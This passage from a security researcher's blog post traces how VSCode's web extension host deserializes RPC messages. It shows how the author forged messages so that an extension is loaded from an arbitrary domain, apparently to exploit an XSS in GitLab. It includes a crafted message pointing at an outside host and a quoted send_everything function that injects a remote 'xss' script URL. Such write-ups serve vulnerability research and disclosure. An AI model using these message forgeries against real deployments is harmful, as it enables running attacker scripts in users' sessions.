                        <span class="na">path</span><span class="p">:</span> <span class="nc">S</span><span class="p">(</span><span class="nx">v</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span> <span class="dl">"</span><span class="s2">.js</span><span class="dl">"</span><span class="p">)</span>
                    <span class="p">});</span>
                    <span class="kd">const</span> <span class="nx">o</span> <span class="o">=</span> <span class="nx">$</span><span class="p">?.</span><span class="nx">identifier</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
                    <span class="nx">o</span> <span class="o">&amp;&amp;</span> <span class="nx">performance</span><span class="p">.</span><span class="nf">mark</span><span class="p">(</span><span class="s2">`code/extHost/willFetchExtensionCode/</span><span class="p">${</span><span class="nx">o</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
                    <span class="kd">const</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">I</span><span class="p">.</span><span class="nx">URI</span><span class="p">.</span><span class="nf">revive</span><span class="p">(</span><span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">C</span><span class="p">.</span><span class="nf">$asBrowserUri</span><span class="p">(</span><span class="nx">v</span><span class="p">))</span>
                      <span class="p">,</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="o">!</span><span class="mi">0</span><span class="p">));</span>
</code></pre></div></div>

<p>Beautifed source:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">protected</span> <span class="k">async</span> <span class="nx">_loadCommonJSModule</span><span class="o">&lt;</span><span class="nx">T</span> <span class="kd">extends</span> <span class="nx">object</span> <span class="o">|</span> <span class="kc">undefined</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">extension</span><span class="p">:</span> <span class="nx">IExtensionDescription</span> <span class="o">|</span> <span class="kc">null</span><span class="p">,</span> <span class="nx">module</span><span class="p">:</span> <span class="nx">URI</span><span class="p">,</span> <span class="nx">activationTimesBuilder</span><span class="p">:</span> <span class="nx">ExtensionActivationTimesBuilder</span><span class="p">):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span> <span class="p">{</span>
		<span class="nx">module</span> <span class="o">=</span> <span class="nx">module</span><span class="p">.</span><span class="nf">with</span><span class="p">({</span> <span class="na">path</span><span class="p">:</span> <span class="nf">ensureSuffix</span><span class="p">(</span><span class="nx">module</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span> <span class="dl">'</span><span class="s1">.js</span><span class="dl">'</span><span class="p">)</span> <span class="p">});</span>
		<span class="kd">const</span> <span class="nx">extensionId</span> <span class="o">=</span> <span class="nx">extension</span><span class="p">?.</span><span class="nx">identifier</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">extensionId</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">performance</span><span class="p">.</span><span class="nf">mark</span><span class="p">(</span><span class="s2">`code/extHost/willFetchExtensionCode/</span><span class="p">${</span><span class="nx">extensionId</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="c1">// First resolve the extension entry point URI to something we can load using `fetch`</span>
		<span class="c1">// This needs to be done on the main thread due to a potential `resourceUriProvider` (workbench api)</span>
		<span class="c1">// which is only available in the main thread</span>
		<span class="kd">const</span> <span class="nx">browserUri</span> <span class="o">=</span> <span class="nx">URI</span><span class="p">.</span><span class="nf">revive</span><span class="p">(</span><span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">_mainThreadExtensionsProxy</span><span class="p">.</span><span class="nf">$asBrowserUri</span><span class="p">(</span><span class="nx">module</span><span class="p">));</span>
		<span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="nx">browserUri</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="kc">true</span><span class="p">));</span>
</code></pre></div></div>

<p>I started stepping in the <code class="language-plaintext highlighter-rouge">activateByEvent</code> only and found that <code class="language-plaintext highlighter-rouge">n</code> is empty, there is nothing returned from the <code class="language-plaintext highlighter-rouge">getExtensionDescriptionsForActivationEvent</code> method as well. Based on the name it‚Äôs clear this gets the extension details based on the provided event eg: <code class="language-plaintext highlighter-rouge">onStartupFinished</code></p>

<p>Stepping in , turns out <code class="language-plaintext highlighter-rouge">this.h</code> is null ah</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="nf">getExtensionDescriptionsForActivationEvent</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
                    <span class="kd">const</span> <span class="nx">i</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">h</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span>
                    <span class="k">return</span> <span class="nx">i</span> <span class="p">?</span> <span class="nx">i</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">:</span> <span class="p">[]</span>
                <span class="p">}</span>
</code></pre></div></div>

<p>Looking to the beautified source:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">public</span> <span class="nf">getExtensionDescriptionsForActivationEvent</span><span class="p">(</span><span class="nx">activationEvent</span><span class="p">:</span> <span class="nx">string</span><span class="p">):</span> <span class="nx">IExtensionDescription</span><span class="p">[]</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="nx">extensions</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_activationMap</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">activationEvent</span><span class="p">);</span>
		<span class="k">return</span> <span class="nx">extensions</span> <span class="p">?</span> <span class="nx">extensions</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">:</span> <span class="p">[];</span>
	<span class="p">}</span>
</code></pre></div></div>

<p>I traced where <code class="language-plaintext highlighter-rouge">_activationMap</code> is used turns out there are two messages that could affect this the first one is that long ass json which we sent as the initial message which contains all the extension data and the other one is <code class="language-plaintext highlighter-rouge">$startExtensionHost</code> which if we look carefully seems to contain extensions details too with fields like</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250725215613.png" alt="Pasted image 20250725215613.png" />
<br />
I quickly checked the same with Gitlab and noticed <code class="language-plaintext highlighter-rouge">myToRemove</code> property is actually empty in case of Gitlab</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729092533.png" alt="Pasted image 20250729092533.png" />
Fig: from my notes</p>

<p>The simple solution for this was to set the <code class="language-plaintext highlighter-rouge">myToRemove</code> property to an empty array at runtime in the <code class="language-plaintext highlighter-rouge">startExtensionHost</code> method we can try it out (I don‚Äôt remember what all happened here but I did followed a lot of rabbit holes untill I found I needed to do this simple thing )</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">z</span><span class="p">.</span><span class="nx">myToRemove</span><span class="o">=</span><span class="p">[]</span>
</code></pre></div></div>

<p>If it still didn‚Äôt had worked then I would have to replace the first message as it might be the case that it doesn‚Äôt contains any extension with that specified activation event.</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250725220516.png" alt="Pasted image 20250725220516.png" /></p>

<p>Now you can see <code class="language-plaintext highlighter-rouge">this.h</code> is populated, it contains event as the key and in value a list of extensions which supports it.</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250725220848.png" alt="Pasted image 20250725220848.png" /></p>

<p>After this it was all good it was reaching the <code class="language-plaintext highlighter-rouge">_loadCommonJSModule</code> method</p>

<p>Now all the magic happens here:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">browserUri</span> <span class="o">=</span> <span class="nx">URI</span><span class="p">.</span><span class="nf">revive</span><span class="p">(</span><span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">_mainThreadExtensionsProxy</span><span class="p">.</span><span class="nf">$asBrowserUri</span><span class="p">(</span><span class="nx">module</span><span class="p">))</span>
</code></pre></div></div>

<p>The value returned by the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> is used in the next line to make a fetch call and later gets executed.</p>

<p>This is where I started to get the real PAIN</p>

<center><img src="/tmp/cdn-images/tenor.gif" alt="tenor.gif" /></center>

<p>Stepping in to the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> call</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nx">_createProxy</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">debugName</span><span class="p">:</span> <span class="nx">string</span><span class="p">):</span> <span class="nx">T</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="nx">handler</span> <span class="o">=</span> <span class="p">{</span>
			<span class="na">get</span><span class="p">:</span> <span class="p">(</span><span class="na">target</span><span class="p">:</span> <span class="nx">any</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="nx">PropertyKey</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">name</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">name</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">===</span> <span class="nx">CharCode</span><span class="p">.</span><span class="nx">DollarSign</span><span class="p">)</span> <span class="p">{</span>
					<span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">]</span> <span class="o">=</span> <span class="p">(...</span><span class="na">myArgs</span><span class="p">:</span> <span class="nx">any</span><span class="p">[])</span> <span class="o">=&gt;</span> <span class="p">{</span>
						<span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nf">_remoteCall</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">myArgs</span><span class="p">);</span>
					<span class="p">};</span>
				<span class="p">}</span>
				<span class="k">if </span><span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="nx">_RPCProxySymbol</span><span class="p">)</span> <span class="p">{</span>
					<span class="k">return</span> <span class="nx">debugName</span><span class="p">;</span>
				<span class="p">}</span>
				<span class="k">return</span> <span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">];</span>
			<span class="p">}</span>
		<span class="p">};</span>
		<span class="k">return</span> <span class="k">new</span> <span class="nc">Proxy</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nf">create</span><span class="p">(</span><span class="kc">null</span><span class="p">),</span> <span class="nx">handler</span><span class="p">);</span>
	<span class="p">}</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729131301.png" alt="Pasted image 20250729131301.png" />
<br />
The <code class="language-plaintext highlighter-rouge">rpcId</code> correspond to the rpc method each method has a unique <code class="language-plaintext highlighter-rouge">rpcId</code>, as we are talking about <code class="language-plaintext highlighter-rouge">rpcId</code> I will explain one more thing here which I mentioned in my starting of the blogpost</p>

<blockquote>

  <p>After setting up the VSCode web server up , if we pass the same hex data in this. The breakpoint doesn‚Äôt hits not even for the <code class="language-plaintext highlighter-rouge">initializeConfiguration</code> .Based on this it seemed each instance have it‚Äôs own configuration the important thing is in the very first message that long ass json value (I will explain the exact root cause later which I figured out while writing this blogpost, for the time being just follow along).</p>
</blockquote>

<p>Below I will explain how the message which we are sending through the port are being handled by VSCode.</p>

<p>The raw messages are being handled here as they are in buffer format</p>

<p>Example message:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x01\x00\x00\x00\x02H\x18$initializeConfiguration\x00\x01I\x05[{"defaults":{"contents":{"editor":{"tabSize":4,"inde
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">messageType</code> and <code class="language-plaintext highlighter-rouge">req</code> values decides how the buffer message is going to be parsed and handled, these values are retrieved from those hex escape sequences which you can see in the example message above:</p>

<p>What we are sending is actually serialized RPC messages which  VSCode will deserialized and use accordingly</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_receiveOneMessage</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">:</span> <span class="nx">VSBuffer</span><span class="p">):</span> <span class="k">void</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_isDisposed</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="kd">const</span> <span class="nx">msgLength</span> <span class="o">=</span> <span class="nx">rawmsg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">;</span>
		<span class="kd">const</span> <span class="nx">buff</span> <span class="o">=</span> <span class="nx">MessageBuffer</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">messageType</span> <span class="o">=</span> <span class="o">&lt;</span><span class="nx">MessageType</span><span class="o">&gt;</span><span class="nx">buff</span><span class="p">.</span><span class="nf">readUInt8</span><span class="p">();</span>
		<span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="nx">buff</span><span class="p">.</span><span class="nf">readUInt32</span><span class="p">();</span>

		<span class="k">switch </span><span class="p">(</span><span class="nx">messageType</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">case</span> <span class="nx">MessageType</span><span class="p">.</span><span class="na">RequestJSONArgs</span><span class="p">:</span>
			<span class="k">case</span> <span class="nx">MessageType</span><span class="p">.</span><span class="na">RequestJSONArgsWithCancellation</span><span class="p">:</span> <span class="p">{</span>
				<span class="kd">let</span> <span class="p">{</span> <span class="nx">rpcId</span><span class="p">,</span> <span class="nx">method</span><span class="p">,</span> <span class="nx">args</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">deserializeRequestJSONArgs</span><span class="p">(</span><span class="nx">buff</span><span class="p">);</span>
				<span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_uriTransformer</span><span class="p">)</span> <span class="p">{</span>
					<span class="nx">args</span> <span class="o">=</span> <span class="nf">transformIncomingURIs</span><span class="p">(</span><span class="nx">args</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">_uriTransformer</span><span class="p">);</span>
				<span class="p">}</span>
				<span class="k">this</span><span class="p">.</span><span class="nf">_receiveRequest</span><span class="p">(</span><span class="nx">msgLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">rpcId</span><span class="p">,</span> <span class="nx">method</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="p">(</span><span class="nx">messageType</span> <span class="o">===</span> <span class="nx">MessageType</span><span class="p">.</span><span class="nx">RequestJSONArgsWithCancellation</span><span class="p">));</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
<span class="p">[...]</span>
<span class="p">[...]</span>
</code></pre></div></div>

<p>You can see example values here:
<img src="/tmp/cdn-images/Pasted%20image%2020250729133341.png" alt="Pasted image 20250729133341.png" />
<br /></p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_receiveRequest</span><span class="p">(</span><span class="nx">msgLength</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">req</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">method</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[],</span> <span class="nx">usesCancellationToken</span><span class="p">:</span> <span class="nx">boolean</span><span class="p">):</span> <span class="k">void</span> <span class="p">{</span>
        
        <span class="p">[...]</span>
		<span class="p">[...]</span>
		
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="c1">// cannot be cancelled</span>
			<span class="nx">promise</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">_invokeHandler</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">,</span> <span class="nx">method</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">_invokeHandler</code> method is responsible for invoking that method as the name suggest.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_invokeHandler</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[]):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">any</span><span class="o">&gt;</span> <span class="p">{</span>
		<span class="k">try</span> <span class="p">{</span>
			<span class="k">return</span> <span class="nb">Promise</span><span class="p">.</span><span class="nf">resolve</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">_doInvokeHandler</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">,</span> <span class="nx">args</span><span class="p">));</span>
		<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span> <span class="nb">Promise</span><span class="p">.</span><span class="nf">reject</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_doInvokeHandler</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[]):</span> <span class="nx">any</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="nx">actor</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_locals</span><span class="p">[</span><span class="nx">rpcId</span><span class="p">];</span>
		<span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">actor</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Unknown actor </span><span class="dl">'</span> <span class="o">+</span> <span class="nf">getStringIdentifierForProxy</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">));</span>
		<span class="p">}</span>
		<span class="kd">const</span> <span class="nx">method</span> <span class="o">=</span> <span class="nx">actor</span><span class="p">[</span><span class="nx">methodName</span><span class="p">];</span>
		<span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">method</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">function</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Unknown method </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">methodName</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> on actor </span><span class="dl">'</span> <span class="o">+</span> <span class="nf">getStringIdentifierForProxy</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">));</span>
		<span class="p">}</span>
		<span class="k">return</span> <span class="nx">method</span><span class="p">.</span><span class="nf">apply</span><span class="p">(</span><span class="nx">actor</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
	<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">rpcId</code> which is extracted using the deserialized method , is used to retrieve an index value from the <code class="language-plaintext highlighter-rouge">this._locals</code> array you can consider this array stores a reference to all of the available rpc methods which could be called.</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729133749.png" alt="Pasted image 20250729133749.png" />
<br />
As discussed each VSCode instance might have different configurations because of which the <code class="language-plaintext highlighter-rouge">rpcId</code> for the same method might be in a different index but as we copied the message from somewhere else the <code class="language-plaintext highlighter-rouge">rpcId</code> doesn‚Äôt matches with the method we are trying to call which makes it throw an error.</p>

<p>To solve this we need to find the correct index value aka <code class="language-plaintext highlighter-rouge">rpcId</code> at which that method exists</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729135636.png" alt="Pasted image 20250729135636.png" />
<br />
For <code class="language-plaintext highlighter-rouge">$initializeConfiguration</code> method the <code class="language-plaintext highlighter-rouge">rpcId</code> is calculated from our serialized message is 72 but using the below code we found that it actually exists on the index 73</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Had to write this manually as AI was fucking around</span>

<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">test</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>    
    <span class="k">try</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">test</span> <span class="o">&amp;&amp;</span> <span class="nx">test</span><span class="p">[</span><span class="nx">U</span><span class="p">])</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Success </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Similarly if I had wanted to make changes to the arbitrary domain where the extension location is fetched from</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\t\x00\x00\x00\x11\x00\x00\x00O{"$mid":1,"path":"/gl/editor/include.js","scheme":"https","authority":"peo.si"}'
</code></pre></div></div>

<p>I remember last year when I was trying to exploit, I had no idea how fix the length after decoded all I could understand that the front bytes holds some meaning <code class="language-plaintext highlighter-rouge">\x01\x00\x00\x00\x112\r</code></p>

<p>So what I did was at that time is to ask Chatgpt. I provided the decoded and encoded version and asked to handle it and it did worked.</p>

<p>Btw here‚Äôs how @joaxcar did it to make modifications to the script src:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">async</span> <span class="kd">function</span> <span class="nf">send_everything</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="s2">`{"$mid":1,"path":"/gitlab/staging/xss/staging-include.js","scheme":"https","authority":"joaxcar.com"}`</span>
        <span class="kd">const</span> <span class="nx">encodedPayload</span> <span class="o">=</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nf">encode</span><span class="p">(</span><span class="nx">payload</span><span class="p">))</span>
        <span class="kd">const</span> <span class="nx">lengthPayload</span> <span class="o">=</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">length</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> 
        <span class="kd">const</span> <span class="nx">hex_lines</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nf">fetch_text</span><span class="p">(</span><span class="dl">"</span><span class="s2">staging_send_hex.txt</span><span class="dl">"</span><span class="p">)).</span><span class="nf">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">617b22246d6964223a312c2270617468223a222f6769746c61622f73746167696e672f73746167696e672d696e636c7564652e6a73222c22736368656d65223a226874747073222c22617574686f72697479223a226a6f61786361722e636f6d227d</span><span class="dl">"</span><span class="p">,</span> <span class="nx">lengthPayload</span> <span class="o">+</span> <span class="nx">encodedPayload</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">)</span>
        <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
</code></pre></div></div>

<p>And the Chatgpt way:</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250727200920.png" alt="Pasted image 20250727200920.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250727201244.png" alt="Pasted image 20250727201244.png" />
<img src="/tmp/cdn-images/Pasted%20image%2020250727201318.png" alt="Pasted image 20250727201318.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250727201353.png" alt="Pasted image 20250727201353.png" />
<img src="/tmp/cdn-images/Pasted%20image%2020250727201439.png" alt="Pasted image 20250727201439.png" />
<br />
<br />
<a href="https://chatgpt.com/share/68863b8c-2584-8000-88ce-08463fb169c2">https://chatgpt.com/share/68863b8c-2584-8000-88ce-08463fb169c2</a> if you are interested you can read it here I made it public, it‚Äôs the real chat back from the time when I was trying to exploit it.</p>

<p>All the messages which we are sending are basically serialized RPC messages, VSCode uses such all throughout their application for communicating through different parts such as the Language server, extensions,etc</p>

<p>You can see the messages how they are decoded and handled starting from here: <a href="https://github.com/microsoft/VSCode/blob/b59f40f0605eb6835e0af9c3716cf5f46c5ef241/src/vs/workbench/services/extensions/common/rpcProtocol.ts#L783">https://github.com/microsoft/VSCode/blob/b59f40f0605eb6835e0af9c3716cf5f46c5ef241/src/vs/workbench/services/extensions/common/rpcProtocol.ts#L783</a></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">public</span> <span class="kd">static</span> <span class="nf">deserializeRequestJSONArgs</span><span class="p">(</span><span class="nx">buff</span><span class="p">:</span> <span class="nx">MessageBuffer</span><span class="p">):</span> <span class="p">{</span> <span class="nl">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">;</span> <span class="nl">method</span><span class="p">:</span> <span class="nx">string</span><span class="p">;</span> <span class="nl">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[]</span> <span class="p">}</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="nx">rpcId</span> <span class="o">=</span> <span class="nx">buff</span><span class="p">.</span><span class="nf">readUInt8</span><span class="p">();</span>
		<span class="kd">const</span> <span class="nx">method</span> <span class="o">=</span> <span class="nx">buff</span><span class="p">.</span><span class="nf">readShortString</span><span class="p">();</span>
		<span class="kd">const</span> <span class="nx">args</span> <span class="o">=</span> <span class="nx">buff</span><span class="p">.</span><span class="nf">readLongString</span><span class="p">();</span>
		<span class="k">return</span> <span class="p">{</span>
			<span class="na">rpcId</span><span class="p">:</span> <span class="nx">rpcId</span><span class="p">,</span>
			<span class="na">method</span><span class="p">:</span> <span class="nx">method</span><span class="p">,</span>
			<span class="na">args</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span>
		<span class="p">};</span>
	<span class="p">}</span>
</code></pre></div></div>

<p>To decode the buffer messages we can use the same helper methods.</p>

<p>Now back to the <code class="language-plaintext highlighter-rouge">_loadCommonJSModule</code> method and to know what happens inside the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> method.</p>

<p>As there is no such <code class="language-plaintext highlighter-rouge">'$asBrowserUri'</code> property inside the target object, it only contains one <code class="language-plaintext highlighter-rouge">$onWillActivateExtension</code> method continuing with the flow the same method gets called again</p>

<p>This time it‚Äôs the get handler for <code class="language-plaintext highlighter-rouge">_createProxy</code>, it seems as earlier target object didn‚Äôt had the expected <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> property it‚Äôs invoking the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> method to populate target object with it</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kd">const</span> <span class="nx">handler</span> <span class="o">=</span> <span class="p">{</span>
			<span class="na">get</span><span class="p">:</span> <span class="p">(</span><span class="na">target</span><span class="p">:</span> <span class="nx">any</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="nx">PropertyKey</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">name</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">name</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">===</span> <span class="nx">CharCode</span><span class="p">.</span><span class="nx">DollarSign</span><span class="p">)</span> <span class="p">{</span>
					<span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">]</span> <span class="o">=</span> <span class="p">(...</span><span class="na">myArgs</span><span class="p">:</span> <span class="nx">any</span><span class="p">[])</span> <span class="o">=&gt;</span> <span class="p">{</span>
